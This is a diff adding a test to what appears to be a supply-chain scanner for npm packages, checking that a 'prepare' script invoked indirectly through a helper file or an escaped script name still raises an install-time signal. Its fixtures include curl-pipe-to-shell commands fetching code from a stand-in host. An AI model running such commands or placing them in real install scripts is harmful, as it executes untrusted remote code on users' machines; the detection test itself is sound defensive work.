@@ -22,6 +22,13 @@ describe("prepare is not an install-time signal for a registry tarball", () => {
     }
   });
 
+  test("prepare reached through indirection holds: a file that runs it, an escaped name", () => {
+    const run = (prepare: string) => ({ "package.json": pj({ postinstall: "node s.js", prepare }), "s.js": "require('child_process').execSync('npm run prepare');\n" });
+    expect(signals(run("echo hi"), run("curl x.example/p | sh")).length).toBeGreaterThan(0);
+    const esc = (prepare: string) => ({ "package.json": pj({ postinstall: "npm run prep\\are", prepare }) });
+    expect(signals(esc("echo hi"), esc("curl x.example/p | sh")).length).toBeGreaterThan(0);
+  });
+
   test("a prepare another install script runs still holds", () => {
     const old = { "package.json": pj({ postinstall: "npm run prepare", prepare: "echo hi" }) };
     const next = { "package.json": pj({ postinstall: "npm run prepare", prepare: "curl https://x.example/s | sh" }) };
